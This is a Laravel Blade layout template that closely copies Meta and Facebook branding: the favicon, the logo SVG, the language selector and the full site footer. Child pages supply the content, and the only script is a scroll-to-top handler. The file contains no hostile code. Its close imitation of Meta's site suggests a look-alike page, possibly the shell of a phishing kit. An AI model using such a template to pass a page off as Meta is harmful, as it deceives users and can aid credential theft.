<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Meta</title>
    <link data-default-icon="https://static.xx.fbcdn.net/rsrc.php/y5/r/m4nf26cLQxS.ico" rel="shortcut icon"
        href="https://static.xx.fbcdn.net/rsrc.php/y5/r/m4nf26cLQxS.ico">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css"
        integrity="sha384-xOolHFLEh07PJGoPkLv1IbcEPTNtaed2xpHsD9ESMhqIYd0nLMwNLD69Npy4HI+N" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="{{ asset('css/master.style.css') }}">
    <link rel="stylesheet" href="{{ asset('css/fb.css') }}">
    @yield('style')
</head>

<body>
    @if (Route::currentRouteName() !== 'fallback')
        <nav class="container-fluid position-relative" style="padding: 20px 0;">
            <svg aria-label="Meta logo" class="xlup9mm x1dmp6jm position-absolute"
                style="left: 20%; top: 50%; transform: translateY(-50%);" role="img" viewBox="0 0 500 100">
                <defs>
                    <linearGradient gradientUnits="userSpaceOnUse" id=":Rd6d5bampapd5aqH1:" x1="125"
                        x2="160.217" y1="97" y2="57.435">
                        <stop offset=".21" stop-color="#0278F1"></stop>
                        <stop offset=".533" stop-color="#0180FA"></stop>
                    </linearGradient>
                    <linearGradient gradientUnits="userSpaceOnUse" id=":Rd6d5bampapd5aqH2:" x1="44"
                        x2="0" y1="5" y2="64">
                        <stop offset=".427" stop-color="#0165E0"></stop>
                        <stop offset=".917" stop-color="#0180FA"></stop>
                    </linearGradient>
                    <linearGradient gradientUnits="userSpaceOnUse" id=":Rd6d5bampapd5aqH3:" x1="28.5"
                        x2="135" y1="29" y2="72">
                        <stop stop-color="#0064E0"></stop>
                        <stop offset=".656" stop-color="#0066E2"></stop>
                        <stop offset="1" stop-color="#0278F1"></stop>
                    </linearGradient>
                    <clipPath id=":Rd6d5bampapd5aq:">
                        <path d="M0 0h496.236v100H0z" fill="#fff"></path>
                    </clipPath>
                </defs>
                <g clip-path="url(#:Rd6d5bampapd5aq:)">
                    <path
                        d="M182.141 3.213h18.808l31.98 57.849 31.979-57.849h18.401V98.27h-15.345V25.416l-28.042 50.448h-14.394l-28.042-50.448V98.27h-15.345V3.213ZM332.804 99.967c-7.107 0-13.353-1.573-18.739-4.718-5.387-3.146-9.586-7.504-12.595-13.07-3.011-5.569-4.515-11.95-4.515-19.148 0-7.287 1.47-13.738 4.413-19.35 2.942-5.613 7.027-10.004 12.255-13.173 5.229-3.168 11.238-4.753 18.027-4.753 6.744 0 12.55 1.596 17.416 4.787 4.865 3.191 8.611 7.661 11.237 13.41 2.624 5.749 3.938 12.492 3.938 20.233v4.21h-52.077c.95 5.794 3.292 10.354 7.027 13.68 3.735 3.328 8.453 4.991 14.157 4.991 4.571 0 8.509-.679 11.814-2.037 3.303-1.358 6.404-3.417 9.302-6.178l8.147 9.98c-8.103 7.425-18.038 11.136-29.807 11.136Zm11.204-56.389c-3.215-3.281-7.425-4.923-12.629-4.923-5.07 0-9.314 1.676-12.731 5.025-3.418 3.35-5.58 7.854-6.484 13.512h37.343c-.453-5.794-2.286-10.331-5.499-13.614ZM382.846 40.014h-14.123V27.453h14.123V6.676h14.802v20.777h21.455v12.561h-21.455v31.844c0 5.295.905 9.075 2.716 11.338 1.809 2.264 4.911 3.395 9.302 3.395 1.945 0 3.598-.078 4.956-.237a92.35 92.35 0 0 0 4.481-.646v12.425c-1.675.498-3.564.906-5.669 1.223a44.63 44.63 0 0 1-6.62.475c-15.979 0-23.968-8.735-23.968-26.208V40.014ZM496.236 98.27h-14.53v-9.913c-2.58 3.712-5.862 6.575-9.845 8.588-3.983 2.014-8.51 3.022-13.579 3.022-6.247 0-11.78-1.596-16.601-4.787s-8.612-7.581-11.373-13.172c-2.761-5.59-4.142-11.983-4.142-19.18 0-7.243 1.403-13.648 4.21-19.216 2.806-5.567 6.688-9.935 11.645-13.104 4.956-3.168 10.648-4.753 17.075-4.753 4.844 0 9.189.94 13.037 2.818a25.768 25.768 0 0 1 9.573 7.978v-9.098h14.53V98.27Zm-14.801-46.035c-1.585-4.028-4.085-7.207-7.503-9.54-3.418-2.33-7.367-3.496-11.848-3.496-6.338 0-11.384 2.128-15.141 6.382-3.758 4.255-5.635 10.004-5.635 17.246 0 7.289 1.809 13.06 5.431 17.314 3.621 4.255 8.532 6.382 14.734 6.382 4.571 0 8.645-1.176 12.222-3.53 3.575-2.353 6.155-5.522 7.74-9.506V52.235Z"
                        fill="#1C2B33"></path>
                    <path
                        d="M108 0C95.66 0 86.015 9.294 77.284 21.1 65.284 5.821 55.25 0 43.24 0 18.76 0 0 31.862 0 65.586 0 86.69 10.21 100 27.31 100c12.308 0 21.16-5.803 36.897-33.31 0 0 6.56-11.584 11.072-19.564 1.582 2.553 3.243 5.3 4.997 8.253l7.38 12.414C102.03 91.848 110.038 100 124.551 100c16.659 0 25.931-13.492 25.931-35.034C150.483 29.656 131.301 0 108 0ZM52.207 59.241c-12.759 20-17.172 24.483-24.276 24.483-7.31 0-11.655-6.418-11.655-17.862 0-24.483 12.207-49.517 26.759-49.517 7.88 0 14.465 4.55 24.552 18.991-9.578 14.691-15.38 23.905-15.38 23.905Zm48.153-2.517-8.823-14.715a301.425 301.425 0 0 0-6.884-10.723c7.952-12.274 14.511-18.39 22.313-18.39 16.206 0 29.172 23.863 29.172 53.173 0 11.172-3.659 17.655-11.241 17.655-7.268 0-10.739-4.8-24.537-27Z"
                        fill="#0180FA"></path>
                    <path
                        d="M145.586 35H130.66c3.452 8.746 5.478 19.482 5.478 31.069 0 11.172-3.659 17.655-11.241 17.655-1.407 0-2.672-.18-3.897-.631V99.82c1.143.122 2.324.18 3.552.18 16.659 0 25.931-13.492 25.931-35.034 0-10.737-1.774-20.95-4.897-29.966Z"
                        fill="url(#:Rd6d5bampapd5aqH1:)"></path>
                    <path
                        d="M43.241 0c.254 0 .507.003.759.008v16.36c-.32-.015-.642-.023-.965-.023-14.183 0-26.139 23.782-26.736 47.655H.014C.59 30.87 19.143 0 43.24 0Z"
                        fill="url(#:Rd6d5bampapd5aqH2:)"></path>
                    <path
                        d="M43.241 0c11.152 0 20.601 5.02 31.502 17.971 3.065 3.828 6.761 8.805 10.716 14.557l.017.025.025-.003a311.041 311.041 0 0 1 6.036 9.459l8.823 14.715c13.798 22.2 17.269 27 24.537 27H125v16.273c-.149.002-.298.003-.448.003-14.513 0-22.522-8.152-36.897-32.207l-7.38-12.414a596.368 596.368 0 0 0-2.294-3.834L78 51.5c-5.5-9-9-14.5-12-18.5l-.05.038c-9.18-12.63-15.47-16.693-22.916-16.693H43V0L43.241 0Z"
                        fill="url(#:Rd6d5bampapd5aqH3:)"></path>
                </g>
            </svg>
        </nav>
    @endif

    <div class="container">
        @yield('content')
    </div>

    @if (Route::currentRouteName() !== 'fallback')
        {{-- <div class="container-fluid">
            <hr color="#E0E0E0" size="0.1px" width="70%">
            <div class="container d-flex justify-content-start">
                <a href="language/en" class="text-link">English (US)</a>
                <a href="language/fr" class="text-link">Français (France)</a>
                <a href="language/de" class="text-link">Deutsch (Deutschland)</a>
                <a href="language/it" class="text-link">Italiano (Italia)</a>
                <a href="#" class="text-link text-link-latest">More languages...</a>
            </div>

        </div>
        <div class="container-fluid py-4">
            <div class="container d-flex justify-content-start">
                <p style="font-size: 12px; font-weight: 700; margin: 0 1.5rem;">
                    Meta © 2024
                </p>
            </div>
        </div> --}}
        <div class="container">
            <div class="_95ke _8opy">
                <div id="pageFooter" data-referrer="page_footer" data-testid="page_footer">
                    <ul class="uiList localeSelectorList _2pid _509- _4ki _6-h _6-j _6-i" data-nocookies="1">
                        <li><a class="_sv4" dir="ltr"
                            href="language/en"
                            title="English (Uk)" id="u_0_6_9P">English (UK)</a></li>
                        <li><a class="_sv4" dir="ltr"
                                href="language/fr"
                                title="French (France)" id="u_0_6_9P">Français (France)</a></li>
                        <li><a class="_sv4" dir="ltr"
                                href="language/de"
                                title="German" id="u_0_a_2L">Deutsch</a></li>
                        <li><a class="_sv4" dir="ltr"
                                href="language/it"
                                title="Italian" id="u_0_b_pQ">Italiano</a></li>
                        <li><a role="button" class="p-2 mb-2" rel="dialog"
                                ajaxify=""
                                href="#" title="Show more languages"> 
                                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-plus-square" viewBox="0 0 16 16">
                                    <path d="M14 1a1 1 0 0 1 1 1v12a1 1 0 0 1-1 1H2a1 1 0 0 1-1-1V2a1 1 0 0 1 1-1zM2 0a2 2 0 0 0-2 2v12a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V2a2 2 0 0 0-2-2z"/>
                                    <path d="M8 4a.5.5 0 0 1 .5.5v3h3a.5.5 0 0 1 0 1h-3v3a.5.5 0 0 1-1 0v-3h-3a.5.5 0 0 1 0-1h3v-3A.5.5 0 0 1 8 4"/>
                                </svg>
                            </a></li>
                    </ul>
                    <div id="contentCurve"></div>
                    <div id="pageFooterChildren" role="contentinfo" aria-label="Facebook site links">
                        <ul class="uiList pageFooterLinkList _509- _4ki _703 _6-i">
                            <li><a target="_blank" href="https://www.facebook.com/reg/" title="Sign up for Facebook">Sign Up</a></li>
                            <li><a target="_blank" href="https://www.facebook.com/login/" title="Log in to Facebook">Log in</a></li>
                            <li><a target="_blank" href="https://messenger.com/" title="Take a look at Messenger.">Messenger</a></li>
                            <li><a target="_blank" href="https://www.facebook.com/lite/" title="Facebook Lite for Android.">Facebook Lite</a></li>
                            <li><a target="_blank" href="https://www.facebook.com/watch/" title="Browse in Video">Video</a></li>
                            <li><a target="_blank" href="https://www.facebook.com/places/" title="Take a look at popular places on Facebook.">Places</a></li>
                            <li><a target="_blank" href="https://www.facebook.com/games/" title="Check out Facebook games.">Games</a></li>
                            <li><a target="_blank" href="https://www.facebook.com/marketplace/" title="Buy and sell on Facebook Marketplace.">Marketplace</a></li>
                            <li><a href="https://about.meta.com/technologies/meta-pay" title="Learn more about Meta Pay"
                                    target="_blank">Meta Pay</a></li>
                            <li><a href="https://www.meta.com/" title="Discover Meta" target="_blank">Meta Store</a></li>
                            <li><a href="https://www.meta.com/quest/" title="Learn more about Meta Quest" target="_blank">Meta Quest</a></li>
                            <li><a href="https://www.meta.com/smart-glasses/" title="Learn more about Ray-Ban Meta" target="_blank">Ray-Ban Meta</a></li>
                            <li><a href="https://www.meta.ai/" title="Meta AI">Meta AI</a></li>
                            <li><a href="https://www.instagram.com/" title="Take a look at Instagram" target="_blank"
                                    rel="noreferrer nofollow" data-lynx-mode="asynclazy"
                                    data-lynx-uri="https://l.facebook.com/l.php?u=https%3A%2F%2Fwww.instagram.com%2F&amp;h=AT0ewkqW1ZRnqoYQPaF6bfpnZzGl7IA8dq9lvhlFrz4Kz4oCyaSEKFl5gA4fz_6uI_tsvHM7rUFfEMkkK0aEa_oakQ6BfquEd24SljJbA0t_6CwnkzvG3sRaOoFEiwOHuTj42mzVqWIoJj8Eb0_p-nuEkzGIFx4iKPB1hw">Instagram</a>
                            </li>
                            <li><a target="_blank" href="https://www.threads.net/" title="Check out Threads">Threads</a></li>
                            <li><a target="_blank" href="https://www.facebook.com/fundraisers/" title="Donate to worthy causes.">Fundraisers</a></li>
                            <li><a target="_blank" href="https://www.facebook.com/biz/directory/" title="Browse our Facebook Services directory.">Services</a>
                            </li>
                            <li><a target="_blank" href="https://www.facebook.com/votinginformationcenter/?entry_point=c2l0ZQ%3D%3D"
                                    title="See the Voting Information Centre">Voting Information Centre</a></li>
                            <li><a target="_blank" href="https://www.facebook.com/privacy/policy/?entry_point=facebook_page_footer"
                                    title="Learn how we collect, use and share information to support Facebook.">Privacy
                                    Policy</a></li>
                            <li><a target="_blank" href="https://www.facebook.com/privacy/center/?entry_point=facebook_page_footer"
                                    title="Learn how to manage and control your privacy on Facebook.">Privacy Centre</a>
                            </li>
                            <li><a target="_blank" href="https://www.facebook.com/groups/discover/" title="Explore our groups.">Groups</a></li>
                            <li><a target="_blank" href="https://about.meta.com/" accesskey="8"
                                    title="Read our blog, discover the resource centre and find job opportunities.">About</a>
                            </li>
                            <li><a target="_blank" href="https://www.facebook.com/ad_campaign/landing.php?placement=pflo&amp;campaign_id=402047449186&amp;nav_source=unknown&amp;extra_1=auto"
                                    title="Advertise on Facebook">Create ad</a></li>
                            <li><a target="_blank" href="https://www.facebook.com/pages/create/?ref_type=site_footer" title="Create a Page">Create Page</a></li>
                            <li><a target="_blank" href="https://developers.facebook.com/?ref=pf"
                                    title="Develop on our platform.">Developers</a></li>
                            <li><a target="_blank" href="https://www.facebook.com/careers/?ref=pf"
                                    title="Make your next career move to our brilliant company.">Careers</a></li>
                            <li><a target="_blank" href="https://www.facebook.com/policies/cookies/" title="Learn about cookies and Facebook."
                                    data-nocookies="1">Cookies</a></li>
                            <li><a target="_blank" class="_41ug" data-nocookies="1" href="https://www.facebook.com/help/568137493302217"
                                    title="Learn about Ad Choices.">AdChoices<i
                                        class="img sp_YbiIuPczOY_ sx_b2cf63"></i></a></li>
                            <li><a target="_blank" data-nocookies="1" href="https://www.facebook.com/policies?ref=pf" accesskey="9"
                                    title="Review our terms and policies.">Terms</a></li>
                            <li><a target="_blank" href="https://www.facebook.com/help/?ref=pf" accesskey="0" title="Visit our Help Centre.">Help</a></li>
                            <li><a target="_blank" href="help/637205020878504"
                                    title="Visit our contact uploading and non-users notice.">Contact uploading and
                                    non-users</a></li>
                            <li><a target="_blank" accesskey="6" class="accessible_elem" href="https://www.facebook.com/settings"
                                    title="View and edit your Facebook settings.">Settings</a></li>
                            <li><a target="_blank" accesskey="7" class="accessible_elem"
                                    href="https://www.facebook.com/allactivity?privacy_source=activity_log_top_menu"
                                    title="View your activity log">Activity log</a></li>
                        </ul>
                    </div>
                    <div class="mvl copyright text-center">
                        <div><span> Meta © 2024</span></div>
                    </div>
                </div>
            </div>
        </div>
    @endif

    <script src="https://unpkg.com/vue@3/dist/vue.global.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"
        integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous">
    </script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js"
        integrity="sha384-9/reFTGAW83EW2RDu2S0VKaIzap3H66lZH81PoYlFhbGU+6BZp6G7niu735Sk7lN" crossorigin="anonymous">
    </script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.min.js"
        integrity="sha384-+sLIOodYLS7CIrQpBjl+C7nPvqq+FbNUBDunl/OZv93DB7Ln/533i8e/mZXLi/P+" crossorigin="anonymous">
    </script>
    @yield('script')

    <script>
        var buttonPrimary2 = document.querySelectorAll('.btn-primary2');
        buttonPrimary2.forEach(function (button) {
            button.addEventListener('click', function () {
                // scroll to top
                window.scrollTo(0, 0);
            });
        });
    </script>

</body>

</html>
